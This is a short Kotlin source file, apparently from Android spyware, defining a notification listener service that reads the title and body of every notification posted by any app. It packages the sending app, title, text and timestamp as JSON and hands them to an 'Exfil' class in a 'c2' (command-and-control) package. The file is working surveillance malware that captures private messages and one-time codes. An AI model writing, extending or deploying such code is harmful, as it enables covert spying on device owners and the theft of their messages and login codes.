package com.sp.core.services

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.sp.core.c2.Exfil

class NotificationListener : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        val extras = sbn.notification.extras
        val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
        val big = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""
        val body = if (big.isNotBlank()) big else text
        if (body.isBlank()) return
        val payload = """{"pkg":"${sbn.packageName}","title":"${esc(title)}","body":"${esc(body)}","ts":${sbn.postTime}}"""
        Exfil.sendLog(this, "notification", payload)
    }
    private fun esc(s: String) = s.replace("\\", "\\\\").replace("\"", "\\\"")
}